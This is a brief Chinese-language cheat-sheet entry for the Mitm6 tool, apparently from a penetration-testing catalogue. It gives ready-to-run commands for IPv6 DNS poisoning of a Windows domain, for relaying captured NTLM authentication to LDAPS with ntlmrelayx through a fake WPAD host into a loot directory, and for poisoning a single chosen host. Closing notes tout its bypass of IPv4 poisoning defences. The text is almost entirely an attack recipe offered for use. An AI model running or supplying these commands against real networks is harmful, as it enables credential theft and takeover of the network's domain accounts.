### Mitm6

| 属性 | 值 |
|------|-----|
| 版本 | N/A |
| 平台 | Linux |
| 风险 | 🔴 高 |
| 标签 | `中间人攻击` `IPv6` `欺骗` |

## Mitm6 IPv6 毒化攻击

### 在指定接口上毒化目标域
```bash
bash mitm6_attack.sh -d contoso.com -i eth0
```

### 配合 NTLMRelayx 将请求中继到 LDAPS
```bash
ntlmrelayx.py -6 -t ldaps://192.168.1.10 -wh attacker-wpad -l lootdir
```

### 仅毒化特定的主机
```bash
bash mitm6_attack.sh -d contoso.com -i eth0 --host pc01.contoso.com
```

- ✓ 利用 Windows 默认优先 IPv6 的特性
- ✓ 绕过常见的 IPv4 毒化防御
- 常用于强制触发 NTLM 认证进行中继
